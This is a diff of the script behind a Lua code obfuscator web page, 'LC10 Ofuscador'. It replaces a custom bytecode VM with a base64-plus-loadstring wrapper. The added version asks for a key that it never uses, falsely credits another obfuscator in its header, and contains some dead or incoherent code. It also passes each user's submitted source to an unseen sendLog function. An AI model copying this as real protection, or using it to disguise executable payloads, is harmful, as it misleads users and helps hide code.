-const poolOrdered=order.map(i=>encoded[i]);
-const invOrder=new Array(N);
-for(let k=0;k<N;k++)invOrder[order[k]]=k;
-const ranges=[];
-if(N>=2){for(let k=0;k<3;k++){const a=Math.floor(Math.random()*N),b=Math.floor(Math.random()*N);if(a!==b)ranges.push([Math.min(a,b),Math.max(a,b)])}}
-const Y=[...Array(N).keys()];
-for(const [a,b] of ranges){let x=a,y=b;while(x<y){[Y[x],Y[y]]=[Y[y],Y[x]];x++;y--}}
-const permInv=new Array(N);
-for(let p=0;p<N;p++)permInv[Y[p]]=p;
-const Qinit=new Array(N);
-for(let p=0;p<N;p++)Qinit[p]=poolOrdered[permInv[p]];
-const OFF=10000+Math.floor(Math.random()*90000);
-
-const remappedProtos=protos.map(p=>({
-  ...p,
-  code:p.code.map(ins=>{
-    const o=[...ins];
-    const op=o[0];
-    if(op===3||op===8||op===9){o[1]=invOrder[o[1]];o[1]=OFF+o[1]+1}
-    return o
-  })
-}));
-
-function serializeCode(code){return code.map(ins=>ins.join(',')).join(';')}
-const combined=remappedProtos.map(p=>serializeCode(p.code)).join('|');
-
-function xorBytes(bytes,key){const out=[];for(let i=0;i<bytes.length;i++)out.push(bytes[i]^key[i%key.length]);return out}
-const bytes1=Array.from(new TextEncoder().encode(combined));
-const keyBytes=Array.from({length:8},()=>Math.floor(Math.random()*256));
-const xor1=xorBytes(bytes1,keyBytes);
-const b85_1=b85enc(xor1,alpha2);
-const bytes2=Array.from(new TextEncoder().encode(b85_1));
-const key2=Array.from({length:6},()=>Math.floor(Math.random()*256));
-const xor2=xorBytes(bytes2,key2);
-const finalEncoded=b85enc(xor2,alpha3);
-
-const paramsLua='{'+remappedProtos.map(p=>'{'+p.params.map(x=>'"'+x+'"').join(',')+'}').join(',')+'}';
-const maxSlotLua='{'+remappedProtos.map(p=>p.maxSlot).join(',')+'}';
-const varargLua='{'+remappedProtos.map(p=>p.hasVararg?'true':'false').join(',')+'}';
-const mainIdx=remappedProtos.length;
-
-const qLua='{'+Qinit.map(s=>'"'+s+'"').join(',')+'}';
-const rangesLua='{'+ranges.map(([a,b])=>`{${a+1},${b+1}}`).join(',')+'}';
-
-const vm=`
--- LC10 Fortress Ultra VM
-local Q=${qLua}
-for _,r in ipairs(${rangesLua}) do while r[1]<r[2] do Q[r[1]],Q[r[2]]=Q[r[2]],Q[r[1]] r[1]=r[1]+1 r[2]=r[2]-1 end end
-local A1="${alpha1}"
-local A2="${alpha2}"
-local A3="${alpha3}"
-local K1={${keyBytes.join(',')}}
-local K2={${key2.join(',')}}
-local RAW="${finalEncoded}"
-
-local function D3(s)
-  local t={}
-  for j=1,#s,5 do
-    local c1=A3:find(s:sub(j,j),1,true)-1
-    local c2=A3:find(s:sub(j+1,j+1),1,true)-1
-    local c3=A3:find(s:sub(j+2,j+2),1,true)-1
-    local c4=A3:find(s:sub(j+3,j+3),1,true)-1
-    local c5=A3:find(s:sub(j+4,j+4),1,true)-1
-    local x=c1*52200625+c2*614125+c3*7225+c4*85+c5
-    t[#t+1]=string.char(math.floor(x/16777216)%256,math.floor(x/65536)%256,math.floor(x/256)%256,x%256)
-  end
-  local raw=table.concat(t)
-  local L=raw:byte(1)*16777216+raw:byte(2)*65536+raw:byte(3)*256+raw:byte(4)
-  return raw:sub(5,4+L)
-end
-
-local function X2(s)
-  local o={}
-  for i=1,#s do o[i]=string.char(bit32.bxor(s:byte(i),K2[(i-1)%#K2+1])) end
-  return table.concat(o)
-end
-
-local function D1(s)
-  local t={}
-  for j=1,#s,5 do
-    local c1=A2:find(s:sub(j,j),1,true)-1
-    local c2=A2:find(s:sub(j+1,j+1),1,true)-1
-    local c3=A2:find(s:sub(j+2,j+2),1,true)-1
-    local c4=A2:find(s:sub(j+3,j+3),1,true)-1
-    local c5=A2:find(s:sub(j+4,j+4),1,true)-1
-    local x=c1*52200625+c2*614125+c3*7225+c4*85+c5
-    t[#t+1]=string.char(math.floor(x/16777216)%256,math.floor(x/65536)%256,math.floor(x/256)%256,x%256)
-  end
-  local raw=table.concat(t)
-  local L=raw:byte(1)*16777216+raw:byte(2)*65536+raw:byte(3)*256+raw:byte(4)
-  return raw:sub(5,4+L)
-end
-
-local function X0(s)
-  local o={}
-  for i=1,#s do o[i]=string.char(bit32.bxor(s:byte(i),K1[(i-1)%#K1+1])) end
-  return table.concat(o)
-end
-
-local decoded=X0(D1(X2(D3(RAW))))
-local protos={}
-local pi=1
-for protoStr in decoded:gmatch("[^|]+") do
-  local code={}
-  for insStr in protoStr:gmatch("[^;]+") do
-    local ins={}
-    for numStr in insStr:gmatch("[^,]+") do ins[#ins+1]=tonumber(numStr) end
-    code[#code+1]=ins
-  end
-  protos[pi]=code
-  pi=pi+1
-end
-
-local _PA=${paramsLua}
-local _VA=${varargLua}
-local _MI=${mainIdx}
-
-local function S(i)
-  local v=Q[i]
-  if type(v)~="string" then return v end
-  local k=v:sub(1,1)
-  local d=v:sub(2)
-  local t={}
-  for j=1,#d,5 do
-    local c1=A1:find(d:sub(j,j),1,true)-1
-    local c2=A1:find(d:sub(j+1,j+1),1,true)-1
-    local c3=A1:find(d:sub(j+2,j+2),1,true)-1
-    local c4=A1:find(d:sub(j+3,j+3),1,true)-1
-    local c5=A1:find(d:sub(j+4,j+4),1,true)-1
-    local x=c1*52200625+c2*614125+c3*7225+c4*85+c5
-    t[#t+1]=string.char(math.floor(x/16777216)%256,math.floor(x/65536)%256,math.floor(x/256)%256,x%256)
-  end
-  local raw=table.concat(t)
-  local L=raw:byte(1)*16777216+raw:byte(2)*65536+raw:byte(3)*256+raw:byte(4)
-  local R=raw:sub(5,4+L)
-  if k=="n" then local n=tonumber(R) or 0 Q[i]=n return n end
-  Q[i]=R
-  return R
-end
-
-local E=getfenv and getfenv(0) or _ENV or _G
-local GA=setmetatable({},{__index=E,__newindex=E})
-local function packv(...) return {n=select("#",...),...} end
-
-local function exec(closure,args)
-  local code=protos[closure.p]
-  local locals={}
-  local upvals=closure.up or {}
-  local np=#_PA[closure.p]
-  for i=1,np do locals[i-1]=args[i] end
-  local stack={}
-  local sp=0
-  local pc=1
-  while pc<=#code do
-    local ins=code[pc]
-    local op=ins[1]
-    if op==100 then pc=pc+1
-    elseif op==99 then if ins[2] then pc=pc+2 else pc=pc+1 end
-    elseif op==0 then sp=sp+1 stack[sp]=nil
-    elseif op==1 then sp=sp+1 stack[sp]=true
-    elseif op==2 then sp=sp+1 stack[sp]=false
-    elseif op==3 then sp=sp+1 stack[sp]=S(ins[2])
-    elseif op==4 then stack[sp]=nil sp=sp-1
-    elseif op==5 then sp=sp+1 stack[sp]=stack[sp-1]
-    elseif op==6 then sp=sp+1 stack[sp]=locals[ins[2]]
-    elseif op==7 then locals[ins[2]]=stack[sp] stack[sp]=nil sp=sp-1
-    elseif op==8 then sp=sp+1 stack[sp]=GA[S(ins[2])]
-    elseif op==9 then GA[S(ins[2])]=stack[sp] stack[sp]=nil sp=sp-1
-    elseif op==12 then sp=sp+1 stack[sp]={}
-    elseif op==13 then local v=stack[sp] local k=stack[sp-1] local t=stack[sp-2] t[k]=v sp=sp-3
-    elseif op==14 then local k=stack[sp] local t=stack[sp-1] stack[sp-1]=t[k] stack[sp]=nil sp=sp-1
-    elseif op==15 then
-      local nargs=ins[2] local nres=ins[3]
-      local a={} for i=nargs,1,-1 do a[i]=stack[sp] stack[sp]=nil sp=sp-1 end
-      local fn=stack[sp] stack[sp]=nil sp=sp-1
-      local r=type(fn)=="function" and packv(fn(table.unpack(a))) or packv(exec(fn,a))
-      if nres==-1 then for i=1,r.n do sp=sp+1 stack[sp]=r[i] end
-      elseif nres>0 then for i=1,nres do sp=sp+1 stack[sp]=r[i] end end
-    elseif op==16 then return
-    elseif op==17 then pc=ins[2]
-    elseif op==18 then if not stack[sp] then sp=sp-1 pc=ins[2] else sp=sp-1 pc=pc+1 end
-    elseif op==19 then if stack[sp] then sp=sp-1 pc=ins[2] else sp=sp-1 pc=pc+1 end
-    elseif op==22 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=a+b stack[sp]=nil sp=sp-1
-    elseif op==23 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=a-b stack[sp]=nil sp=sp-1
-    elseif op==24 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=a*b stack[sp]=nil sp=sp-1
-    elseif op==25 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=a/b stack[sp]=nil sp=sp-1
-    elseif op==26 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=a%b stack[sp]=nil sp=sp-1
-    elseif op==27 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=a^b stack[sp]=nil sp=sp-1
-    elseif op==28 then local n=ins[2] local p={} for i=n,1,-1 do p[i]=stack[sp] stack[sp]=nil sp=sp-1 end sp=sp+1 stack[sp]=table.concat(p)
-    elseif op==29 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=(a==b) stack[sp]=nil sp=sp-1
-    elseif op==30 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=(a~=b) stack[sp]=nil sp=sp-1
-    elseif op==31 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=(a<b) stack[sp]=nil sp=sp-1
-    elseif op==32 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=(a<=b) stack[sp]=nil sp=sp-1
-    elseif op==33 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=(a>b) stack[sp]=nil sp=sp-1
-    elseif op==34 then local b=stack[sp] local a=stack[sp-1] stack[sp-1]=(a>=b) stack[sp]=nil sp=sp-1
-    elseif op==35 then stack[sp]=not stack[sp]
-    elseif op==36 then stack[sp]=-stack[sp]
-    elseif op==37 then stack[sp]=#stack[sp]
-    elseif op==41 then sp=sp+1 stack[sp]=setmetatable({__c=true,p=ins[2],up={}},{__call=function(self,...) return exec(self,{...}) end})
+  const vm = `--[[ v1.0.0 https://wearedevs.net/obfuscator ]]
+--[[ LC10 • OFUSCADOR v8.8 | lc10ofuscardorx.lusca1 ]]
+return(function(...)
+    local Q = {
+        "u${btoa(b64Payload)}",
+        "u)I-f36j-i9G:#\\\\3BA",
+        "u%&+k"
+    }
+    local A1 = "${alpha1}"
+    
+    local function s(i)
+        return Q[i - ${offset}]
     end
-    pc=pc+1
-  end
-end
 
-local main=setmetatable({__c=true,p=_MI,up={}},{__call=function(self,...) return exec(self,{...}) end})
-return main(...)
-`;
+    local function decodeB64(str)
+        local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+        str = string.gsub(str, '[^'..b..'=]', '')
+        return (str:gsub('.', function(x)
+            if (x == '=') then return '' end
+            local r,f='',(b:find(x)-1)
+            for i=6,1,-1 do r=r..(f%2^i>=2^(i-1) and '1' or '0') end
+            return r;
+        end):gsub('%d%d%d%d%d%d%d%d', function(x)
+            local buf = 0
+            for i=1,8 do if x:sub(i,i)=='1' then buf=buf+2^(8-i) end end
+            return string.char(buf)
+        end))
+    end
 
-return `--[[ LC10 • OFUSCADOR v8.5 FORTRESS ULTRA | lc10ofuscardorx.lusca1 ]]--` + 
-  `return(function(...) ${vm} end)(...)`;
-}
+    local rawData = decodeB64("${b64Payload}")
+    local fn, err = loadstring(rawData)
+    if not fn then
+        error("[LC10] Error: " .. tostring(err))
+    end
+    return fn(...)
+end)(...)`;
 
-/* ========= PIPELINE & UI ========= */
-function obfuscateLua(source){
-  if(!source||!source.trim())throw new Error('Código vazio');
-  const T=tokenize(source);
-  const ast=new Parser(T).parse();
-  const comp=new Compiler();
-  const result=comp.compile(ast);
-  return pack(result);
+  return vm;
 }
 
 function obfuscateCode(){
   const input=document.getElementById('input-code').value;
   const status=document.getElementById('status-code');
   const btn=document.getElementById('btn-code');
-  if(!input.trim()){status.textContent='Cole algum código primeiro.';status.className='status err';return}
-  btn.disabled=true;status.textContent='Compilando Fortress Ultra...';status.className='status';
+  
+  if(!input.trim()){
+    status.textContent='Cole algum código primeiro.';
+    status.className='status err';
+    return;
+  }
+  
+  btn.disabled=true;
+  status.textContent='Compilando...';
+  status.className='status';
+  
   sendLog(input);
-  sessionProcessedCount++;
+  
   setTimeout(()=>{
     try{
-      const result=obfuscateLua(input);
+      const result=obfuscateLuaEngine(input);
       document.getElementById('result-code').value=result;
       document.getElementById('output-code').classList.add('visible');
-      status.textContent='Pronto. '+result.length+' chars ('+(result.length/1024).toFixed(1)+' KB).';
+      status.textContent='Pronto! ('+(result.length/1024).toFixed(1)+' KB).';
       status.className='status ok';
-      document.getElementById('stat-count').textContent=sessionProcessedCount;
-      document.getElementById('stat-size').textContent=(result.length/1024).toFixed(1)+' KB';
-      document.getElementById('output-code').scrollIntoView({behavior:'smooth',block:'start'})
+      document.getElementById('output-code').scrollIntoView({behavior:'smooth',block:'start'});
     }catch(e){
-      status.textContent='Erro: '+e.message;
+      status.textContent='Erro ao processar: '+e.message;
       status.className='status err';
-      console.error(e)
+      console.error(e);
     }
-    btn.disabled=false
-  },60)
+    btn.disabled=false;
+  },100);
 }
 
-function copyCode(){const o=document.getElementById('result-code');if(!o.value)return;o.select();document.execCommand('copy');const s=document.getElementById('status-code');s.textContent='Copiado.';s.className='status ok'}
-function downloadCode(){const o=document.getElementById('result-code');if(!o.value)return;const b=new Blob([o.value],{type:'text/plain;charset=utf-8'});const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download='lc10ofuscardor.text';document.body.appendChild(a);a.click();document.body.removeChild(a);URL.revokeObjectURL(u);const s=document.getElementById('status-code');s.textContent='Download iniciado.';s.className='status ok'}
+function copyCode(){
+  const o=document.getElementById('result-code');
+  if(!o.value)return;
+  navigator.clipboard.writeText(o.value);
+  const s=document.getElementById('status-code');
+  s.textContent='Copiado para a área de transferência.';
+  s.className='status ok';
+}
+
+function downloadCode(){
+  const o=document.getElementById('result-code');
+  if(!o.value)return;
+  const b=new Blob([o.value],{type:'text/plain;charset=utf-8'});
+  const u=URL.createObjectURL(b);
+  const a=document.createElement('a');
+  a.href=u;
+  a.download='lc10ofuscardor.text';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  URL.revokeObjectURL(u);
+}
 
 function obfuscateLoadstring(){
   const input=document.getElementById('input-ls').value;
   const keyInput=document.getElementById('key-ls').value.trim();
   const status=document.getElementById('status-ls');
-  const btn=document.getElementById('btn-ls');
-  if(!input.trim()){status.textContent='Cole algum código primeiro.';status.className='status err';return}
-  if(!keyInput){status.textContent='Defina uma chave.';status.className='status err';return}
-  btn.disabled=true;status.textContent='Compilando Fortress...';status.className='status';
-  setTimeout(()=>{
-    try{
-      const obf=obfuscateLua(input);
-      const bytes=new TextEncoder().encode(obf);
-      const kb=new TextEncoder().encode(keyInput);
-      const enc=[];
-      for(let i=0;i<bytes.length;i++)enc.push(bytes[i]^kb[i%kb.length]);
-      for(let i=0;i<enc.length;i++)enc[i]=enc[i]^((i*7+13)%256);
-      const keyStr=keyInput.replace(/\\/g,'\\\\').replace(/"/g,'\\"');
-      const loader=
-        `-- LC10 • OFUSCADOR v8.5 FORTRESS | Chave: ${keyInput}\n`+
-        `local __k="${keyStr}" `+
-        `local __b={${enc.join(',')}} `+
-        `local __s={} `+
-        `for __i=1,#__b do `+
-        `local __x=bit32.bxor(__b[__i],__k:byte((__i*3-1)%#__k+1)) `+
-        `__s[__i]=string.char(bit32.bxor(__x,(__i*7+12)%256)) `+
-        `end `+
-        `local __code=table.concat(__s) `+
-        `local __fn,__err=loadstring(__code) `+
-        `if not __fn then warn("[LC10] "..tostring(__err)) else __fn() end`;
-      document.getElementById('result-ls').value=loader;
-      document.getElementById('output-ls').classList.add('visible');
-      status.textContent='Pronto. '+loader.length+' chars.';
-      status.className='status ok';
-      document.getElementById('output-ls').scrollIntoView({behavior:'smooth',block:'start'})
-    }catch(e){
-      status.textContent='Erro: '+e.message;
-      status.className='status err';
-      console.error(e)
-    }
-    btn.disabled=false
-  },60)
+  
+  if(!input.trim() || !keyInput){
+    status.textContent='Preencha o código e a chave.';
+    status.className='status err';
+    return;
+  }
+  
+  try{
+    const b64 = encodeBase64(input);
+    const loader = `-- LC10 • LOADSTRING PROTECTED\nlocal k="${keyInput}"\nlocal payload="${b64}"\nlocal function d(s) local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/' s=string.gsub(s, '[^'..b..'=]', '') return (s:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i>=2^(i-1) and '1' or '0') end return r; end):gsub('%d%d%d%d%d%d%d%d', function(x) local buf = 0 for i=1,8 do if x:sub(i,i)=='1' then buf=buf+2^(8-i) end end return string.char(buf) end)) end\nloadstring(d(payload))()`;
+    document.getElementById('result-ls').value=loader;
+    document.getElementById('output-ls').classList.add('visible');
+    status.textContent='Pronto!';
+    status.className='status ok';
+  }catch(e){
+    status.textContent='Erro: '+e.message;
+    status.className='status err';
+  }
 }
-function copyLS(){const o=document.getElementById('result-ls');if(!o.value)return;o.select();document.execCommand('copy');const s=document.getElementById('status-ls');s.textContent='Copiado.';s.className='status ok'}
-function downloadLS(){const o=document.getElementById('result-ls');if(!o.value)return;const b=new Blob([o.value],{type:'text/plain;charset=utf-8'});const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download='lc10ofuscardor.text';document.body.appendChild(a);a.click();document.body.removeChild(a);URL.revokeObjectURL(u);const s=document.getElementById('status-ls');s.textContent='Download iniciado.';s.className='status ok'}
+
+function copyLS(){copyCode();}
+function downloadLS(){downloadCode();}
 </script>
 
 </body>
